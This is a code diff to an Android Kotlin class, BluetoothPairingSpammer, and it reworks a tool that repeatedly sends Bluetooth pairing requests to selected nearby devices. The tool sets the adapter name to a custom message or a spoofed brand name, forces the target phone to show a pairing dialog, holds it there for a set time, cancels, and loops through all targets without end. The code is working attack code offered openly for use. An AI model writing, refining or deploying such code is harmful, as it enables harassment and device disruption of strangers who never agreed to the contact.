@@ -16,27 +16,30 @@ import kotlinx.coroutines.flow.StateFlow
 import kotlinx.coroutines.flow.asStateFlow
 
 /**
- * Sends mass Bluetooth pairing requests to selected target devices.
+ * Precision Bluetooth pairing — creates real connections that show numeric
+ * comparison dialogs on target devices.
  *
- * The attack works by:
- * 1. Setting the local adapter name to a custom message (via setName())
- * 2. Calling createBond() on each target device
- * 3. The target phone shows a system pairing dialog with the custom name
- * 4. Cycling through targets and repeating
+ * Flow per target:
+ * 1. Set adapter name to custom message (this IS the device name shown on target)
+ * 2. Call createBond() to initiate Secure Simple Pairing (SSP)
+ * 3. Wait for ACTION_PAIRING_REQUEST — confirms key exchange started and
+ *    target is showing a pairing dialog with our name + a numeric code
+ * 4. Dwell for configurable time so target reads the message
+ * 5. Cancel bond and move to next target
  *
- * This is the correct approach — the "message" IS the device name shown
- * in the pairing popup. No HID connection or keystrokes needed.
+ * Devices that don't respond within timeout are skipped — no wasted cycles.
  */
 class BluetoothPairingSpammer {
 
     companion object {
-        private const val TAG = "BtPairingSpam"
-        private const val BOND_CYCLE_DELAY_MS = 800L
-        private const val BOND_FIRE_DELAY_MS = 500L
-        // Cray mode: let the notification RENDER before canceling (1.5s),
-        // then move to next target fast (200ms between targets)
-        private const val CRAY_CYCLE_DELAY_MS = 200L
-        private const val CRAY_FIRE_DELAY_MS = 1500L
+        private const val TAG = "BtPairingConnect"
+
+        // How long to wait for the target to respond with a pairing dialog
+        const val DEFAULT_TARGET_TIMEOUT_MS = 10_000L
+        // How long to keep the dialog visible after confirmation
+        const val DEFAULT_DWELL_MS = 4_000L
+        // Settle time after canceling before moving to next target
+        private const val SETTLE_MS = 500L
 
         // Chaotic names rotated per-target in cray mode
         private val CRAY_NAMES = listOf(
@@ -51,34 +54,46 @@ class BluetoothPairingSpammer {
 
     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
 
-    private val _connectionAttempts = MutableStateFlow(0)
-    val connectionAttempts: StateFlow<Int> = _connectionAttempts.asStateFlow()
+    // --- Public state ---
+    private val _confirmedCount = MutableStateFlow(0)
+    val confirmedCount: StateFlow<Int> = _confirmedCount.asStateFlow()
+
+    private val _skippedCount = MutableStateFlow(0)
+    val skippedCount: StateFlow<Int> = _skippedCount.asStateFlow()
+
+    private val _totalAttempts = MutableStateFlow(0)
+    val totalAttempts: StateFlow<Int> = _totalAttempts.asStateFlow()
 
     private val _activeTargets = MutableStateFlow(0)
     val activeTargets: StateFlow<Int> = _activeTargets.asStateFlow()
 
+    private val _currentTarget = MutableStateFlow<String?>(null)
+    val currentTarget: StateFlow<String?> = _currentTarget.asStateFlow()
+
     private val _lastError = MutableStateFlow<String?>(null)
     val lastError: StateFlow<String?> = _lastError.asStateFlow()
 
+    // --- Internal state ---
     private var adapter: BluetoothAdapter? = null
     private var originalAdapterName: String? = null
     private var customMessage: String = ""
     private var spamJob: Job? = null
-    private var bondReceiver: BroadcastReceiver? = null
+    private var receiver: BroadcastReceiver? = null
     private var appContext: Context? = null
-
-    private var cycleDelay = BOND_CYCLE_DELAY_MS
-    private var fireDelay = BOND_FIRE_DELAY_MS
     private var isCrayMode = false
 
+    // Configurable timing
+    var targetTimeoutMs = DEFAULT_TARGET_TIMEOUT_MS
+    var dwellMs = DEFAULT_DWELL_MS
+
+    // Event-driven: the receiver signals this when ACTION_PAIRING_REQUEST fires
+    // for the device we're currently targeting
+    @Volatile private var currentTargetAddress: String? = null
+    private var pairingDeferred: CompletableDeferred<Int>? = null
+
     /**
-     * Start spamming pairing requests to the given target devices.
-     *
-     * @param context Android context
-     * @param customName The message to display (becomes the BT adapter name)
-     * @param targets Set of MAC addresses to spam
-     * @param discoveredDevices Full list of discovered BluetoothDevice objects
-     * @param crayMode If true, uses turbo timing for maximum chaos
+     * Start precision pairing against the given targets.
+     * Processes one device at a time, waits for confirmed key exchange.
      */
     fun start(
         context: Context,
@@ -87,13 +102,14 @@ class BluetoothPairingSpammer {
         discoveredDevices: List<BluetoothDevice>,
         crayMode: Boolean = false
     ) {
-        cycleDelay = if (crayMode) CRAY_CYCLE_DELAY_MS else BOND_CYCLE_DELAY_MS
-        fireDelay = if (crayMode) CRAY_FIRE_DELAY_MS else BOND_FIRE_DELAY_MS
         isCrayMode = crayMode
         appContext = context.applicationContext
         _lastError.value = null
-        _connectionAttempts.value = 0
+        _confirmedCount.value = 0
+        _skippedCount.value = 0
+        _totalAttempts.value = 0
         _activeTargets.value = targets.size
+        _currentTarget.value = null
 
         val btManager = context.getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager
         adapter = btManager?.adapter
@@ -105,165 +121,223 @@ class BluetoothPairingSpammer {
 
         customMessage = customName
 
-        // Step 1: Save original name and set custom message as BT name
-        // Must set BEFORE any interaction with targets to avoid name caching
         try {
             originalAdapterName = adapter?.name
             adapter?.setName(customName)
             Log.d(TAG, "Adapter name set to: '$customName' (was: '$originalAdapterName')")
-            // Wait for name to propagate to EIR (Extended Inquiry Response)
-            Thread.sleep(500)
-            // Verify name was actually set
-            val verifiedName = adapter?.name
-            Log.d(TAG, "Adapter name verified: '$verifiedName'")
-            CrashLogger.log(context, TAG, "Started pairing spam: name='$customName' verified='$verifiedName' targets=${targets.size}")
+            Thread.sleep(300)
+            CrashLogger.log(context, TAG, "Precision pairing started: name='$customName' targets=${targets.size} dwell=${dwellMs}ms timeout=${targetTimeoutMs}ms cray=$crayMode")
         } catch (e: SecurityException) {
-            Log.e(TAG, "Failed to set adapter name", e)
             _lastError.value = "Permission denied: cannot set Bluetooth name"
             return
         }
 
-        // Register receiver to track bond state changes
-        registerBondReceiver(context)
+        registerReceiver(context)
 
-        // Step 2: Get actual BluetoothDevice objects for targets
         val targetDevices = discoveredDevices.filter { targets.contains(it.address) }
-
         if (targetDevices.isEmpty()) {
             _lastError.value = "No target devices found"
             return
         }
 
-        // Step 3: Start the spam loop
         spamJob = scope.launch {
-            Log.d(TAG, "Spam loop started for ${targetDevices.size} targets")
+            Log.d(TAG, "Precision loop started for ${targetDevices.size} targets")
             while (isActive) {
                 for (device in targetDevices) {
                     if (!isActive) break
                     try {
-                        sendPairingRequest(device)
-                        _connectionAttempts.value++
+                        connectToTarget(device)
                     } catch (e: Exception) {
-                        Log.w(TAG, "Pairing request to ${device.address} failed: ${e.message}")
+                        Log.w(TAG, "Target ${device.address} error: ${e.message}")
                     }
-                    delay(cycleDelay)
+                    _totalAttempts.value++
+                    delay(SETTLE_MS)
                 }
             }
         }
     }
 
-    private suspend fun sendPairingRequest(device: BluetoothDevice) {
+    /**
+     * Core per-target flow: bond → wait for pairing dialog → dwell → cancel.
+     */
+    private suspend fun connectToTarget(device: BluetoothDevice) {
         val address = device.address
+        _currentTarget.value = address
+
         try {
-            // Set name before EVERY bond attempt — in cray mode, rotate to random name
+            // Set name before each attempt — in cray mode, rotate through known brands
             val nameToUse = if (isCrayMode) CRAY_NAMES.random() else customMessage
             try {
                 adapter?.setName(nameToUse)
             } catch (_: SecurityException) { }
 
-            // Remove existing bond first (if bonded, createBond won't show dialog)
-            val bondState = device.bondState
-            val bondDelay = if (isCrayMode) 50L else 300L
-            if (bondState == BluetoothDevice.BOND_BONDED) {
-                Log.d(TAG, "Removing existing bond with $address")
-                removeBond(device)
-                delay(bondDelay)
-            } else if (bondState == BluetoothDevice.BOND_BONDING) {
-                cancelBond(device)
-                delay(bondDelay)
+            // Clear any existing bond state — must be BOND_NONE for dialog to show
+            when (device.bondState) {
+                BluetoothDevice.BOND_BONDED -> {
+                    Log.d(TAG, "[$address] Removing existing bond")
+                    removeBond(device)
+                    delay(300)
+                }
+                BluetoothDevice.BOND_BONDING -> {
+                    cancelBond(device)
+                    delay(200)
+                }
             }
 
-            // createBond() triggers the pairing dialog on the target device
-            // The dialog shows our custom adapter name as the requesting device
-            Log.d(TAG, "Sending pairing request to $address (bond=$bondState, name='${adapter?.name}')")
-            val result = device.createBond()
-            Log.d(TAG, "createBond($address) returned: $result")
+            // Set up the deferred BEFORE calling createBond
+            currentTargetAddress = address
+            pairingDeferred = CompletableDeferred()
 
-            // Fire-and-forget: cancel bond after short delay so we don't wait
-            // for user approval — allows fast iteration over a list of targets
-            delay(fireDelay)
+            // Initiate SSP pairing — this sends the pairing request over the air
+            Log.d(TAG, "[$address] Initiating pairing as '$nameToUse'")
+            val bondStarted = device.createBond()
+
+            if (!bondStarted) {
+                Log.w(TAG, "[$address] createBond() returned false — skipping")
+                _skippedCount.value++
+                return
+            }
+
+            // Wait for ACTION_PAIRING_REQUEST — proves the target is showing the dialog
+            val pairingVariant = try {
+                withTimeout(targetTimeoutMs) {
+                    pairingDeferred!!.await()
+                }
+            } catch (_: TimeoutCancellationException) {
+                -1 // timeout
+            }
+
+            if (pairingVariant >= 0) {
+                // Confirmed — target is showing the pairing dialog with our name
+                _confirmedCount.value++
+                val variantName = when (pairingVariant) {
+                    0 -> "PIN"
+                    1 -> "PASSKEY"
+                    2 -> "NUMERIC_COMPARISON"
+                    3 -> "CONSENT"
+                    else -> "VARIANT_$pairingVariant"
+                }
+                Log.d(TAG, "[$address] CONFIRMED — dialog showing ($variantName), dwelling ${dwellMs}ms")
+
+                // Dwell — let them read the name and see the numeric code
+                delay(dwellMs)
+            } else {
+                // No response within timeout — device didn't engage
+                _skippedCount.value++
+                Log.d(TAG, "[$address] No pairing response within ${targetTimeoutMs}ms — skipped")
+            }
+
+            // Cancel and clean up — we never actually complete the pairing
             cancelBond(device)
+            // Brief extra settle to let the cancel propagate
+            delay(100)
+
         } catch (e: SecurityException) {
-            Log.w(TAG, "SecurityException sending pairing to $address", e)
+            Log.w(TAG, "[$address] SecurityException", e)
+            _skippedCount.value++
         } catch (e: Exception) {
-            Log.w(TAG, "Error sending pairing to $address: ${e.message}", e)
+            Log.w(TAG, "[$address] Error: ${e.message}", e)
+            _skippedCount.value++
+        } finally {
+            currentTargetAddress = null
+            pairingDeferred = null
+            _currentTarget.value = null
         }
     }
 
     private fun cancelBond(device: BluetoothDevice) {
         try {
-            val cancelMethod = device.javaClass.getMethod("cancelBondProcess")
-            cancelMethod.invoke(device)
+            val method = device.javaClass.getMethod("cancelBondProcess")
+            method.invoke(device)
             Log.d(TAG, "Cancelled bond with ${device.address}")
         } catch (_: Exception) { }
     }
 
-    /**
-     * Remove an existing bond using reflection (no public API for this).
-     */
     private fun removeBond(device: BluetoothDevice) {
         try {
             val method = device.javaClass.getMethod("removeBond")
             method.invoke(device)
-            Log.d(TAG, "removeBond(${device.address}) invoked")
         } catch (e: Exception) {
             Log.w(TAG, "removeBond failed for ${device.address}: ${e.message}")
         }
     }
 
     fun stop(context: Context) {
-        Log.d(TAG, "Stopping pairing spam")
+        Log.d(TAG, "Stopping precision pairing (confirmed=${_confirmedCount.value} skipped=${_skippedCount.value})")
         spamJob?.cancel()
         spamJob = null
+        currentTargetAddress = null
+        pairingDeferred?.cancel()
+        pairingDeferred = null
+        _currentTarget.value = null
 
-        // Restore original adapter name
         originalAdapterName?.let { name ->
-            try {
-                adapter?.setName(name)
-                Log.d(TAG, "Restored adapter name to: '$name'")
-            } catch (_: SecurityException) { }
+            try { adapter?.setName(name) } catch (_: SecurityException) { }
         }
 
-        // Unregister bond receiver
-        bondReceiver?.let {
+        receiver?.let {
             try { context.unregisterReceiver(it) } catch (_: Exception) { }
         }
-        bondReceiver = null
+        receiver = null
     }
 
-    private fun registerBondReceiver(context: Context) {
-        bondReceiver = object : BroadcastReceiver() {
+    /**
+     * Register for both ACTION_PAIRING_REQUEST and ACTION_BOND_STATE_CHANGED.
+     * ACTION_PAIRING_REQUEST is the gold signal — it means both devices are in
+     * the key exchange phase and the target is showing a dialog.
+     */
+    private fun registerReceiver(context: Context) {
+        receiver = object : BroadcastReceiver() {
             override fun onReceive(ctx: Context, intent: Intent) {
-                if (intent.action == BluetoothDevice.ACTION_BOND_STATE_CHANGED) {
-                    val device = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                        intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE, BluetoothDevice::class.java)
-                    } else {
-                        @Suppress("DEPRECATION")
-                        intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE)
+                val device = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                    intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE, BluetoothDevice::class.java)
+                } else {
+                    @Suppress("DEPRECATION")
+                    intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE)
+                }
+
+                when (intent.action) {
+                    BluetoothDevice.ACTION_PAIRING_REQUEST -> {
+                        val variant = intent.getIntExtra(BluetoothDevice.EXTRA_PAIRING_VARIANT, -1)
+                        Log.d(TAG, "ACTION_PAIRING_REQUEST from ${device?.address} variant=$variant")
+
+                        // Signal the waiting coroutine if this is our current target
+                        if (device?.address == currentTargetAddress) {
+                            pairingDeferred?.complete(variant)
+                        }
                     }
-                    val state = intent.getIntExtra(BluetoothDevice.EXTRA_BOND_STATE, BluetoothDevice.BOND_NONE)
-                    val prevState = intent.getIntExtra(BluetoothDevice.EXTRA_PREVIOUS_BOND_STATE, BluetoothDevice.BOND_NONE)
-                    val stateName = when (state) {
-                        BluetoothDevice.BOND_NONE -> "NONE"
-                        BluetoothDevice.BOND_BONDING -> "BONDING"
-                        BluetoothDevice.BOND_BONDED -> "BONDED"
-                        else -> "UNKNOWN($state)"
+                    BluetoothDevice.ACTION_BOND_STATE_CHANGED -> {
+                        val state = intent.getIntExtra(BluetoothDevice.EXTRA_BOND_STATE, BluetoothDevice.BOND_NONE)
+                        val prev = intent.getIntExtra(BluetoothDevice.EXTRA_PREVIOUS_BOND_STATE, BluetoothDevice.BOND_NONE)
+                        val stateName = when (state) {
+                            BluetoothDevice.BOND_NONE -> "NONE"
+                            BluetoothDevice.BOND_BONDING -> "BONDING"
+                            BluetoothDevice.BOND_BONDED -> "BONDED"
+                            else -> "UNKNOWN($state)"
+                        }
+                        Log.d(TAG, "BOND_STATE: ${device?.address} $prev -> $stateName")
                     }
-                    Log.d(TAG, "Bond state: ${device?.address} $prevState -> $stateName")
                 }
             }
         }
 
-        val filter = IntentFilter(BluetoothDevice.ACTION_BOND_STATE_CHANGED)
+        val filter = IntentFilter().apply {
+            addAction(BluetoothDevice.ACTION_PAIRING_REQUEST)
+            addAction(BluetoothDevice.ACTION_BOND_STATE_CHANGED)
+            priority = IntentFilter.SYSTEM_HIGH_PRIORITY
+        }
         try {
             ContextCompat.registerReceiver(
                 context,
-                bondReceiver!!,
+                receiver!!,
                 filter,
                 ContextCompat.RECEIVER_EXPORTED
             )
         } catch (e: Exception) {
-            Log.w(TAG, "Failed to register bond receiver: ${e.message}")
+            Log.w(TAG, "Failed to register receiver: ${e.message}")
         }
     }
+
+    // Legacy compat: total connection attempts = confirmed + skipped
+    val connectionAttempts: StateFlow<Int> = _totalAttempts
 }
